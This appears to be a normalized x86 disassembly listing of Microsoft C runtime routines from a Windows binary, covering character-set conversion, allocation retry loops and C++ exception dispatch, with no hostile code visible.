lea eax [ ecx + 0x100 ]
push eax
push ecx
call sub_41a1a0
mov eax [ esi + 0x88 ]
add esp 0x24
test eax eax
je r-xdata
cmp [ ebp - 0x12 ] bl
je r-xdata
lea edi [ esi + 0x4 ]
movzx edx [ ecx - 0x1 ]
movzx eax al
jmp r-xdata
mov eax [ ebp - 0x2c ]
mov [ eax ] 0x1
mov [ esi + 0x88 ] eax
lea eax [ edi + 0x100 ]
mov [ esi + 0x90 ] eax
lea eax [ edi + 0xfe ]
mov [ esi + 0x8c ] eax
mov eax [ ebp - 0x3c ]
mov [ esi + 0x94 ] eax
mov eax [ ebp - 0x38 ]
mov [ esi + 0x98 ] eax
mov eax [ ebp - 0x30 ]
mov [ esi + 0x74 ] eax
jmp r-xdata
push eax
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
lea ecx [ ebp - 0x11 ]
cmp edx eax
jle r-xdata
push [ ebp - 0x28 ]
call sub_417912
pop ecx
mov eax ebx
pop edi
jmp r-xdata
mov eax [ esi + 0x8c ]
sub eax 0xfe
push eax
call sub_417912
mov eax [ esi + 0x94 ]
add eax 0xffffff80
push eax
call sub_417912
mov eax [ esi + 0x98 ]
add eax 0xffffff80
push eax
call sub_417912
push [ esi + 0x88 ]
call sub_417912
add esp 0x10
movzx edx [ ecx - 0x1 ]
movzx eax al
cmp edx eax
jg r-xdata
mov [ edx + edi ] 0x20
movzx eax [ ecx ]
inc edx
add ecx 0x2
cmp [ ecx - 0x1 ] bl
jne r-xdata
add ecx 0x2
cmp [ ecx - 0x1 ] bl
jne r-xdata
lea eax [ edi + 0x100 ]
lea eax [ eax + edx * 2 ]
mov [ ebp - 0x34 ] eax
mov edi eax
mov al [ ecx ]
test al al
je r-xdata
mov al [ ecx ]
test al al
je r-xdata
mov eax 0x8000
mov [ edi ] ax
movzx eax [ ecx ]
inc edx
lea edi [ edi + 0x2 ]
cmp edx eax
jle r-xdata
mov edi [ ebp - 0x20 ]
sub_41b65a
push ebp
mov ebp esp
push ecx
push ecx
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
mov esi [ ebp + 0x18 ]
push edi
test esi esi
jle r-xdata
mov ecx [ ebp + 0x24 ]
xor edi edi
test ecx ecx
jne r-xdata
mov eax [ ebp + 0x14 ]
mov ecx esi
xor eax eax
cmp [ ebp + 0x28 ] eax
push 0x0
setne al
push 0x0
push esi
push [ ebp + 0x14 ]
lea eax [ eax * 8 + 0x1 ]
push eax
push ecx
call [ MultiByteToWideChar@IAT ]
mov ecx eax
mov [ ebp - 0x8 ] ecx
test ecx ecx
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
mov eax [ eax + 0x4 ]
mov [ ebp + 0x24 ] eax
mov ecx eax
mov eax esi
sub eax ecx
dec eax
cmp eax esi
lea esi [ eax + 0x1 ]
jl r-xdata
inc eax
test ecx ecx
jne r-xdata
jle r-xdata
xor eax eax
jmp r-xdata
mov esi eax
dec ecx
cmp [ eax ] 0x0
je r-xdata
or ecx 0xffffffff
xor ebx ebx
push 0xffffffe0
xor edx edx
pop eax
div ecx
cmp eax 0x2
jb r-xdata
lea esp [ ebp - 0x14 ]
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_4170bc
leave
retn
push ecx
push ebx
push esi
push [ ebp + 0x14 ]
push 0x1
push [ ebp + 0x24 ]
call [ MultiByteToWideChar@IAT ]
test eax eax
je r-xdata
lea ecx [ ecx * 2 + 0x8 ]
cmp ecx 0x400
ja r-xdata
push ebx
call sub_419a5a
pop ecx
mov eax edi
mov esi [ ebp - 0x8 ]
push 0x0
push 0x0
push esi
push ebx
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call sub_41e8ef
mov edi eax
add esp 0x18
test edi edi
je r-xdata
push ecx
call sub_41794a
mov ebx eax
pop ecx
test ebx ebx
je r-xdata
mov eax ecx
call sub_424c40
mov ebx esp
test ebx ebx
je r-xdata
mov ecx 0x400
test [ ebp + 0x10 ] ecx
je r-xdata
mov ecx [ ebp - 0x8 ]
jmp r-xdata
mov [ ebx ] 0xdddd
mov [ ebx ] 0xcccc
jmp r-xdata
test edi edi
jle r-xdata
mov ecx [ ebp + 0x20 ]
test ecx ecx
je r-xdata
test ebx ebx
je r-xdata
add ebx 0x8
xor esi esi
push 0xffffffe0
xor edx edx
pop eax
div edi
cmp eax 0x2
jb r-xdata
cmp edi ecx
jg r-xdata
push edi
push esi
push [ ebp - 0x8 ]
push ebx
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call sub_41e8ef
add esp 0x18
test eax eax
je r-xdata
lea eax [ edi * 2 + 0x8 ]
cmp eax ecx
ja r-xdata
push ecx
push [ ebp + 0x1c ]
push esi
push ebx
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call sub_41e8ef
add esp 0x18
jmp r-xdata
push esi
call sub_419a5a
pop ecx
xor eax eax
push eax
push eax
cmp [ ebp + 0x20 ] eax
jne r-xdata
push eax
call sub_41794a
mov esi eax
pop ecx
test esi esi
je r-xdata
call sub_424c40
mov esi esp
test esi esi
je r-xdata
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push eax
push eax
jmp r-xdata
mov [ esi ] 0xdddd
mov [ esi ] 0xcccc
jmp r-xdata
push edi
push esi
push eax
push [ ebp + 0x24 ]
call [ WideCharToMultiByte@IAT ]
mov edi eax
test esi esi
je r-xdata
add esi 0x8
jmp r-xdata
sub_41b843
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x10 ]
call sub_4199d2
push [ ebp + 0x28 ]
lea eax [ ebp - 0x10 ]
push [ ebp + 0x24 ]
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call sub_41b65a
add esp 0x24
cmp [ ebp - 0x4 ] 0x0
je r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
sub_41b887
push ebp
mov ebp esp
push esi
push edi
xor esi esi
mov eax edi
pop edi
pop esi
pop ebp
retn
cmp [ rw-data ] eax
jbe r-xdata
push esi
call [ Sleep@IAT ]
lea ecx [ esi + 0x3e8 ]
mov esi ecx
cmp ecx [ rw-data ]
jbe r-xdata
cmp esi 0xffffffff
jne r-xdata
or esi 0xffffffff
push 0x0
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_426ad5
mov edi eax
add esp 0xc
test edi edi
jne r-xdata
sub_41b8d1
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ rw-data ]
xor esi esi
pop edi
pop esi
mov eax ebx
pop ebx
pop ebp
retn
test edi edi
je r-xdata
push esi
call [ Sleep@IAT ]
mov edi [ rw-data ]
lea ecx [ esi + 0x3e8 ]
mov esi ecx
cmp ecx edi
jbe r-xdata
cmp esi 0xffffffff
jne r-xdata
or esi 0xffffffff
push [ ebp + 0x8 ]
call sub_41794a
mov ebx eax
pop ecx
test ebx ebx
jne r-xdata
sub_41b91a
push ebp
mov ebp esp
push esi
push edi
xor esi esi
mov eax edi
pop edi
pop esi
pop ebp
retn
cmp [ ebp + 0xc ] eax
je r-xdata
cmp [ rw-data ] eax
jbe r-xdata
push esi
call [ Sleep@IAT ]
lea eax [ esi + 0x3e8 ]
mov esi eax
cmp eax [ rw-data ]
jbe r-xdata
cmp esi 0xffffffff
jne r-xdata
or esi 0xffffffff
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_426a2a
mov edi eax
pop ecx
pop ecx
test edi edi
jne r-xdata
sub_41b966
push 0x8
push r--data
call sub_41ecb0
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
call sub_41ecf5
retn
cmp [ eax ] 0xe06d7363
jne r-xdata
cmp [ eax + 0x10 ] 0x3
jne r-xdata
cmp [ eax + 0x14 ] 0x19930520
je r-xdata
mov ecx [ eax + 0x1c ]
test ecx ecx
je r-xdata
cmp [ eax + 0x14 ] 0x19930521
je r-xdata
mov edx [ ecx + 0x4 ]
test edx edx
je r-xdata
cmp [ eax + 0x14 ] 0x19930522
jne r-xdata
test [ ecx ] 0x10
je r-xdata
and [ ebp - 0x4 ] 0x0
push edx
push [ eax + 0x18 ]
call sub_41aa7f
mov [ ebp - 0x4 ] 0xfffffffe
jmp r-xdata
mov eax [ eax + 0x18 ]
mov ecx [ eax ]
test ecx ecx
je r-xdata
mov eax [ ecx ]
push ecx
call [ eax + 0x8 ]
sub_41ba17
push ebp
mov ebp esp
push esi
mov esi ecx
mov [ esi ] r--data
call sub_418b71
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call j_sub_417912#2
pop ecx
sub_41ba3c
push 0x30
push r--data
call sub_41ecb0
mov eax [ ebp + 0x18 ]
mov [ ebp - 0x1c ] eax
xor ebx ebx
mov [ ebp - 0x38 ] ebx
mov edi [ ebp + 0xc ]
mov eax [ edi - 0x4 ]
mov [ ebp - 0x28 ] eax
mov esi [ ebp + 0x8 ]
push [ esi + 0x18 ]
lea eax [ ebp - 0x40 ]
push eax
call sub_41ac5d
pop ecx
pop ecx
mov [ ebp - 0x2c ] eax
call sub_4246d6
mov eax [ eax + 0x88 ]
mov [ ebp - 0x30 ] eax
call sub_4246d6
mov eax [ eax + 0x8c ]
mov [ ebp - 0x34 ] eax
call sub_4246d6
mov [ eax + 0x88 ] esi
call sub_4246d6
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x8c ] ecx
mov [ ebp - 0x4 ] ebx
xor eax eax
inc eax
mov [ ebp + 0x10 ] eax
mov [ ebp - 0x4 ] eax
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push edi
call sub_41aa21
add esp 0x14
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] ebx
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
mov [ ebp + 0x10 ] 0x0
call sub_41bb8b
mov eax edi
call sub_41ecf5
retn
sub_41badb
mov esp [ ebp - 0x18 ]
call sub_4246d6
xor ebx ebx
mov [ eax + 0x3ac ] ebx
mov edx [ ebp + 0x14 ]
mov edi [ ebp + 0xc ]
cmp [ edx + 0x4 ] 0x80
jg r-xdata
mov ecx [ edi + 0x8 ]
movsx ecx [ edi + 0x8 ]
jmp r-xdata
push ecx
push edx
push ebx
push edi
call sub_41c4e4
add esp 0x10
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x4 ] ebx
mov esi [ ebp + 0x8 ]
mov [ ebp - 0x4 ] 0xfffffffe
mov [ ebp + 0x10 ] 0x0
call sub_41bb8b
mov eax edi
call sub_41ecf5
retn
mov esi eax
imul esi esi 0x14
mov edi [ edx + 0x10 ]
cmp ecx [ esi + edi + 0x4 ]
mov edi [ ebp + 0xc ]
jle r-xdata
mov [ ebp - 0x20 ] ecx
mov eax [ edx + 0x10 ]
mov [ ebp + 0x18 ] eax
mov eax ebx
mov [ ebp - 0x24 ] eax
cmp [ edx + 0xc ] eax
jbe r-xdata
inc eax
mov [ ebp - 0x24 ] eax
cmp eax [ edx + 0xc ]
jb r-xdata
mov edx [ ebp + 0x18 ]
cmp ecx [ esi + edx + 0x8 ]
mov edx [ ebp + 0x14 ]
jg r-xdata
imul eax eax 0x14
mov ecx [ edx + 0x10 ]
mov eax [ eax + ecx + 0x4 ]
inc eax
mov [ ebp - 0x20 ] eax
mov ecx [ edx + 0x8 ]
mov ecx [ ecx + eax * 8 ]
mov [ ebp - 0x20 ] ecx
jmp r-xdata
sub_41bb8b
mov eax [ ebp - 0x28 ]
mov [ edi - 0x4 ] eax
push [ ebp - 0x2c ]
call sub_41ac87
pop ecx
call sub_4246d6
mov ecx [ ebp - 0x30 ]
mov [ eax + 0x88 ] ecx
call sub_4246d6
mov ecx [ ebp - 0x34 ]
mov [ eax + 0x8c ] ecx
cmp [ esi ] 0xe06d7363
jne r-xdata
mov edi [ ebp - 0x1c ]
cmp [ esi + 0x10 ] 0x3
jne r-xdata
cmp [ esi + 0x14 ] 0x19930520
je r-xdata
mov edi [ ebp - 0x1c ]
cmp [ ebp - 0x38 ] 0x0
jne r-xdata
cmp [ esi + 0x14 ] 0x19930521
je r-xdata
retn
test edi edi
je r-xdata
cmp [ esi + 0x14 ] 0x19930522
jne r-xdata
push [ esi + 0x18 ]
call sub_41acd7
pop ecx
test eax eax
je r-xdata
push [ ebp + 0x10 ]
push esi
call sub_41b966
pop ecx
pop ecx
jmp r-xdata
sub_41bc4a
push ebp
mov ebp esp
cmp [ ebp + 0x20 ] 0x0
push edi
mov edi [ ebp + 0xc ]
je r-xdata
cmp [ ebp + 0x2c ] 0x0
push [ ebp + 0x8 ]
jne r-xdata
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push edi
push [ ebp + 0x8 ]
call sub_41c283
add esp 0x10
push [ ebp + 0x2c ]
push edi
jmp r-xdata
pop edi
pop ebp
retn
push edi
push eax
call sub_41abda
call sub_41ac0a
push esi
mov esi [ ebp + 0x24 ]
push [ esi ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push edi
call sub_41c4e4
mov eax [ esi + 0x4 ]
push 0x100
push [ ebp + 0x28 ]
inc eax
mov [ edi + 0x8 ] eax
mov eax [ ebp + 0x1c ]
push [ eax + 0xc ]
push [ ebp + 0x18 ]
push [ ebp + 0x10 ]
push edi
push [ ebp + 0x8 ]
call sub_41ba3c
add esp 0x2c
pop esi
test eax eax
je r-xdata
sub_41bcc5
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
cmp [ eax ] 0xe06d7363
jne r-xdata
xor eax eax
pop ebp
retn
cmp [ eax + 0x10 ] 0x3
jne r-xdata
cmp [ eax + 0x14 ] 0x19930520
je r-xdata
cmp [ eax + 0x1c ] 0x0
jne r-xdata
cmp [ eax + 0x14 ] 0x19930521
je r-xdata
call sub_4246d6
xor ecx ecx
inc ecx
mov [ eax + 0x3ac ] ecx
mov eax ecx
pop ebp
retn
cmp [ eax + 0x14 ] 0x19930522
jne r-xdata
sub_41bd12
push ebp
mov ebp esp
sub esp 0x3c
mov eax [ ebp + 0xc ]
push ebx
push esi
push edi
mov edi [ ebp + 0x18 ]
xor ebx ebx
cmp [ edi + 0x4 ] 0x80
mov [ ebp - 0x24 ] bl
mov [ ebp - 0x1 ] bl
jg r-xdata
mov eax [ eax + 0x8 ]
movsx eax [ eax + 0x8 ]
jmp r-xdata
call sub_423330
cmp eax [ edi + 0x4 ]
jl r-xdata
mov [ ebp - 0x8 ] eax
cmp eax 0xffffffff
jl r-xdata
mov esi [ ebp + 0x8 ]
cmp [ esi ] 0xe06d7363
jne r-xdata
mov eax [ ebp + 0x10 ]
cmp [ esi + 0x10 ] 0x3
jne r-xdata
call sub_4246d6
cmp [ eax + 0x94 ] ebx
je r-xdata
cmp [ ebp + 0x1c ] bl
jne r-xdata
mov eax [ ebp + 0x10 ]
mov [ ebp + 0x8 ] eax
jmp r-xdata
cmp [ esi + 0x14 ] 0x19930520
je r-xdata
pop edi
pop esi
pop ebx
leave
retn
call sub_423330
call sub_423368
push [ ebp + 0x24 ]
push [ ebp + 0x20 ]
push [ ebp - 0x8 ]
push edi
push [ ebp + 0x14 ]
push eax
push [ ebp + 0xc ]
push esi
call sub_41c0ad
add esp 0x20
cmp [ esi ] 0xe06d7363
jne r-xdata
cmp [ esi + 0x1c ] ebx
jne r-xdata
cmp [ esi + 0x14 ] 0x19930521
je r-xdata
cmp [ edi + 0xc ] ebx
jbe r-xdata
cmp [ esi + 0x10 ] 0x3
jne r-xdata
call sub_4246d6
cmp [ eax + 0x88 ] ebx
je r-xdata
cmp [ esi + 0x14 ] 0x19930522
jne r-xdata
cmp [ esi + 0x14 ] 0x19930520
je r-xdata
call sub_4246d6
mov esi [ eax + 0x88 ]
call sub_4246d6
mov eax [ eax + 0x8c ]
push 0x1
push esi
mov [ ebp + 0x8 ] eax
mov [ ebp - 0x24 ] 0x1
call sub_426b4f
pop ecx
pop ecx
test eax eax
jne r-xdata
cmp [ edi + 0xc ] ebx
jbe r-xdata
cmp [ esi + 0x14 ] 0x19930521
je r-xdata
cmp [ esi ] 0xe06d7363
jne r-xdata
call sub_423330
cmp [ ebp + 0x1c ] 0x0
je r-xdata
lea eax [ ebp - 0x28 ]
push eax
lea eax [ ebp - 0x10 ]
push eax
push [ ebp - 0x8 ]
push [ ebp + 0x20 ]
push edi
call sub_41ab5b
mov ecx [ ebp - 0x10 ]
add esp 0x14
cmp ecx [ ebp - 0x28 ]
jae r-xdata
cmp [ esi + 0x14 ] 0x19930522
jne r-xdata
call sub_4246d6
cmp [ eax + 0x94 ] ebx
je r-xdata
cmp [ esi + 0x10 ] 0x3
jne r-xdata
cmp [ ebp - 0x1 ] 0x0
jne r-xdata
push 0x1
push esi
call sub_41b966
pop ecx
pop ecx
lea edx [ eax + 0x10 ]
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x14 ] edx
mov eax [ ebp + 0x8 ]
call sub_4246d6
mov eax [ eax + 0x94 ]
mov [ ebp - 0x14 ] eax
call sub_4246d6
push [ ebp - 0x14 ]
mov [ eax + 0x94 ] ebx
push esi
call sub_41c1c7
pop ecx
pop ecx
test al al
jne r-xdata
cmp [ esi + 0x14 ] 0x19930520
je r-xdata
mov eax [ edi ]
and eax 0x1fffffff
cmp eax 0x19930521
jb r-xdata
inc ecx
add edx 0x14
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x14 ] edx
cmp ecx [ ebp - 0x28 ]
jb r-xdata
cmp eax [ edx - 0xc ]
jg r-xdata
mov edi [ ebp - 0x14 ]
cmp [ edi ] ebx
jle r-xdata
cmp [ esi + 0x1c ] ebx
jne r-xdata
cmp [ esi + 0x14 ] 0x19930521
je r-xdata
cmp [ edi + 0x1c ] 0x0
je r-xdata
lea ebx [ edx - 0x10 ]
mov [ ebp - 0x2c ] ebx
mov ebx [ ebp + 0xc ]
cmp [ edx - 0x10 ] eax
jg r-xdata
xor ebx ebx
mov edi [ edx ]
mov [ ebp - 0xc ] edi
mov edi [ edx - 0x4 ]
mov [ ebp - 0x20 ] edi
test edi edi
mov edi [ ebp + 0x18 ]
jle r-xdata
mov eax ebx
mov [ ebp + 0x18 ] ebx
call sub_423330
cmp [ esi + 0x14 ] 0x19930522
jne r-xdata
push [ edi + 0x1c ]
push esi
call sub_41c1c7
pop ecx
pop ecx
test al al
jne r-xdata
mov ecx [ ebp - 0xc ]
push 0x1
push esi
call sub_41b966
pop ecx
pop ecx
lea eax [ ebp + 0x18 ]
push eax
lea ecx [ ebp - 0x3c ]
mov [ ebp + 0x18 ] r--data
call sub_418b0e
push r--data
lea eax [ ebp - 0x3c ]
push eax
mov [ ebp - 0x3c ] r--data
call sub_41a87b
mov eax [ ebp + 0x18 ]
inc ebx
add eax 0x10
mov [ ebp + 0x18 ] eax
cmp ebx [ edi ]
jl r-xdata
call sub_4246d6
call sub_4246d6
call sub_4246d6
mov [ eax + 0x88 ] esi
call sub_4246d6
cmp [ ebp + 0x24 ] 0x0
mov ecx [ ebp + 0x8 ]
mov [ eax + 0x8c ] ecx
push esi
jne r-xdata
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x1c ] edx
test eax eax
jg r-xdata
mov ecx [ edi + 0x4 ]
push rw-data
mov ecx [ eax + ecx + 0x4 ]
call sub_417722
test al al
jne r-xdata
jmp r-xdata
push [ ebp + 0x24 ]
push [ ebp + 0xc ]
jmp r-xdata
push [ esi + 0x1c ]
mov eax [ edx ]
push eax
push ecx
mov [ ebp - 0x30 ] eax
call sub_41c69c
add esp 0xc
test eax eax
jne r-xdata
mov eax [ ebp - 0x20 ]
dec eax
add ecx 0x10
mov [ ebp - 0x20 ] eax
mov [ ebp - 0xc ] ecx
test eax eax
jg r-xdata
call sub_41ac0a
push 0xffffffff
push edi
push [ ebp + 0x14 ]
push [ ebp + 0xc ]
call sub_41c4e4
add esp 0x10
push [ edi + 0x1c ]
call sub_41bc0a
push [ ebp - 0x24 ]
mov [ ebp - 0x1 ] 0x1
push [ ebp + 0x24 ]
push [ ebp + 0x20 ]
push [ ebp - 0x2c ]
push [ ebp - 0x30 ]
push [ ebp - 0xc ]
push edi
push [ ebp + 0x14 ]
push [ ebp + 0x8 ]
push ebx
push esi
call sub_41bc4a
add esp 0x2c
mov eax [ ebp - 0x18 ]
mov edx [ ebp - 0x1c ]
mov ecx [ ebp - 0xc ]
dec eax
add edx 0x4
mov eax [ esi + 0x1c ]
mov eax [ eax + 0xc ]
lea edx [ eax + 0x4 ]
mov eax [ eax ]
jmp r-xdata
jmp r-xdata
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x8 ]
mov ecx [ ebp - 0x10 ]
sub_41c0ad
push ebp
mov ebp esp
push ecx
push ecx
push edi
mov edi [ ebp + 0x8 ]
cmp [ edi ] 0x80000003
je r-xdata
pop edi
leave
retn
push ebx
push esi
call sub_4246d6
cmp [ eax + 0x80 ] 0x0
mov ebx [ ebp + 0x18 ]
je r-xdata
cmp [ ebx + 0xc ] 0x0
jne r-xdata
push 0x0
call [ EncodePointer@IAT ]
mov esi eax
call sub_4246d6
cmp [ eax + 0x80 ] esi
je r-xdata
lea eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x8 ]
push eax
push [ ebp + 0x1c ]
push [ ebp + 0x20 ]
push ebx
call sub_41ab5b
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
add esp 0x14
cmp ecx edx
jae r-xdata
call sub_423330
cmp [ edi ] 0xe0434f4d
je r-xdata
pop esi
pop ebx
lea esi [ eax + 0xc ]
mov eax [ ebp + 0x1c ]
cmp [ edi ] 0xe0434352
je r-xdata
inc ecx
add esi 0x14
mov [ ebp - 0x8 ] ecx
cmp ecx edx
jb r-xdata
cmp eax [ esi - 0x8 ]
jg r-xdata
push [ ebp + 0x24 ]
push [ ebp + 0x20 ]
push ebx
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push edi
call sub_41aa86
add esp 0x1c
test eax eax
jne r-xdata
cmp eax [ esi - 0xc ]
jl r-xdata
mov eax [ esi ]
mov edi [ esi + 0x4 ]
shl eax 0x4
mov edi [ edi + eax - 0xc ]
test edi edi
je r-xdata
mov edi [ esi + 0x4 ]
add edi 0xfffffff0
add eax edi
mov edi [ ebp + 0x8 ]
test [ eax ] 0x40
jne r-xdata
mov edx [ esi + 0x4 ]
mov ebx [ edx + eax - 0xc ]
mov edx [ ebp - 0x4 ]
cmp [ ebx + 0x8 ] 0x0
mov ebx [ ebp + 0x18 ]
jne r-xdata
mov eax [ ebp + 0x1c ]
push 0x1
push [ ebp + 0x24 ]
lea ecx [ esi - 0xc ]
push [ ebp + 0x20 ]
push ecx
push 0x0
push eax
push ebx
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push edi
call sub_41bc4a
mov edx [ ebp - 0x4 ]
mov ecx [ ebp - 0x8 ]
add esp 0x2c
sub_41c1c7
push ebp
mov ebp esp
push ecx
push ecx
push ebx
push esi
mov esi [ ebp + 0xc ]
push edi
test esi esi
je r-xdata
call sub_423330
xor ebx ebx
mov edi ebx
cmp [ esi ] ebx
jle r-xdata
pop edi
pop esi
mov al bl
pop ebx
leave
retn
mov ecx ebx
mov [ ebp + 0xc ] ebx
inc edi
add ecx 0x10
mov [ ebp + 0xc ] ecx
cmp edi [ esi ]
jl r-xdata
mov eax [ ebp + 0x8 ]
push [ eax + 0x1c ]
mov eax [ esi + 0x4 ]
push [ edx ]
add eax ecx
push eax
call sub_41c69c
mov ecx [ ebp + 0xc ]
add esp 0xc
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x1c ]
mov eax [ eax + 0xc ]
lea edx [ eax + 0x4 ]
mov eax [ eax ]
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
test eax eax
jle r-xdata
mov bl 0x1
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
dec eax
add edx 0x4
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x8 ] edx
test eax eax
jg r-xdata
jmp r-xdata
sub_41c25e
push ebp
mov ebp esp
mov ecx [ ebp + 0xc ]
mov edx [ ebp + 0x8 ]
mov eax [ ecx ]
push esi
mov esi [ ecx + 0x4 ]
add eax edx
test esi esi
js r-xdata
pop esi
pop ebp
retn
mov ecx [ ecx + 0x8 ]
mov edx [ esi + edx ]
mov ecx [ edx + ecx ]
add ecx esi
add eax ecx
sub_41c283
push 0x8
push r--data
call sub_41ecb0
mov edx [ ebp + 0x10 ]
mov ecx [ ebp + 0xc ]
test [ edx ] 0x80000000
je r-xdata
lea edi [ ecx + 0xc ]
add edi [ edx + 0x8 ]
mov edi ecx
jmp r-xdata
lea eax [ esi + 0x8 ]
push eax
push [ ebx + 0x18 ]
call sub_41c25e
pop ecx
pop ecx
push eax
push [ esi + 0x18 ]
push edi
call sub_41aa7f
dec eax
jne r-xdata
and [ ebp - 0x4 ] 0x0
mov esi [ ebp + 0x14 ]
push esi
push edx
push ecx
mov ebx [ ebp + 0x8 ]
push ebx
call sub_41c311
add esp 0x10
dec eax
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_41ecf5
retn
push 0x1
lea eax [ esi + 0x8 ]
push eax
push [ ebx + 0x18 ]
call sub_41c25e
pop ecx
pop ecx
push eax
push [ esi + 0x18 ]
push edi
call sub_41aa7f
jmp r-xdata
sub_41c311
push 0xc
push r--data
call sub_41ecb0
xor ebx ebx
mov eax [ ebp + 0x10 ]
mov ecx [ eax + 0x4 ]
test ecx ecx
je r-xdata
xor eax eax
cmp [ ecx + 0x8 ] bl
je r-xdata
mov ecx [ eax + 0x8 ]
test ecx ecx
jne r-xdata
mov edx [ eax ]
mov edi [ ebp + 0xc ]
test edx edx
js r-xdata
test [ eax ] 0x80000000
je r-xdata
mov [ ebp - 0x4 ] ebx
push 0x1
test dl 0x8
je r-xdata
add edi 0xc
add edi ecx
mov esi [ ebp + 0x14 ]
mov eax [ ebp + 0x8 ]
push [ eax + 0x18 ]
test [ esi ] 0x1
je r-xdata
mov esi [ ebp + 0x8 ]
push [ esi + 0x18 ]
call sub_426b4f
pop ecx
pop ecx
test eax eax
je r-xdata
cmp [ esi + 0x18 ] ebx
jne r-xdata
call sub_426b4f
pop ecx
pop ecx
test eax eax
je r-xdata
call sub_423330
push 0x1
push edi
call sub_426b4f
pop ecx
pop ecx
test eax eax
je r-xdata
call sub_426b4f
pop ecx
pop ecx
test eax eax
je r-xdata
call sub_426b4f
pop ecx
pop ecx
test eax eax
je r-xdata
push 0x1
push edi
call sub_426b4f
pop ecx
pop ecx
test eax eax
je r-xdata
mov ecx [ esi + 0x18 ]
mov [ edi ] ecx
mov eax [ ebp + 0x14 ]
add eax 0x8
push eax
push ecx
push 0x1
push edi
call sub_426b4f
pop ecx
pop ecx
test eax eax
je r-xdata
push 0x1
push edi
call sub_426b4f
pop ecx
pop ecx
test eax eax
je r-xdata
push [ esi + 0x14 ]
mov eax [ ebp + 0x8 ]
push [ eax + 0x18 ]
push edi
call sub_4170d0
add esp 0xc
cmp [ esi + 0x14 ] 0x4
jne r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
mov eax ebx
jmp r-xdata
push [ esi + 0x18 ]
call sub_426b4f
pop ecx
test eax eax
je r-xdata
push [ esi + 0x14 ]
lea eax [ esi + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
push [ eax + 0x18 ]
call sub_41c25e
pop ecx
pop ecx
push eax
push edi
call sub_4170d0
add esp 0xc
jmp r-xdata
cmp [ edi ] 0x0
je r-xdata
call sub_41ecf5
retn
test [ esi ] 0x4
push 0x0
pop ebx
setne bl
inc ebx
mov [ ebp - 0x1c ] ebx
jmp r-xdata
lea eax [ esi + 0x8 ]
push eax
push [ edi ]
jmp r-xdata
call sub_41c25e
pop ecx
pop ecx
mov [ edi ] eax
jmp r-xdata
sub_41c496
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
cmp [ eax ] 0xe0434352
je r-xdata
call sub_4246d6
cmp [ eax + 0x90 ] 0x0
jle r-xdata
cmp [ eax ] 0xe0434f4d
je r-xdata
xor eax eax
pop ebp
retn
call sub_4246d6
dec [ eax + 0x90 ]
cmp [ eax ] 0xe06d7363
jne r-xdata
call sub_4246d6
and [ eax + 0x90 ] 0x0
jmp sub_423368
sub_41c4e4
push 0x10
push r--data
call sub_41ecb0
mov eax [ ebp + 0x10 ]
cmp [ eax + 0x4 ] 0x80
mov eax [ ebp + 0x8 ]
jg r-xdata
mov esi [ eax + 0x8 ]
movsx esi [ eax + 0x8 ]
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_41c5a3
cmp esi [ ebp + 0x14 ]
je r-xdata
cmp esi 0xffffffff
jle r-xdata
mov [ ebp - 0x1c ] esi
call sub_4246d6
inc [ eax + 0x90 ]
and [ ebp - 0x4 ] 0x0
mov eax [ ebp + 0x8 ]
mov [ eax + 0x8 ] esi
call sub_41ecf5
retn
call sub_423330
call sub_423330
mov eax [ ebp + 0x10 ]
cmp esi [ eax + 0x4 ]
jl r-xdata
mov ecx [ ebp + 0x10 ]
mov eax [ ecx + 0x8 ]
mov edx [ eax + esi * 8 ]
mov [ ebp - 0x20 ] edx
mov [ ebp - 0x4 ] 0x1
cmp [ eax + esi * 8 + 0x4 ] 0x0
je r-xdata
and [ ebp - 0x4 ] 0x0
mov esi [ ebp - 0x20 ]
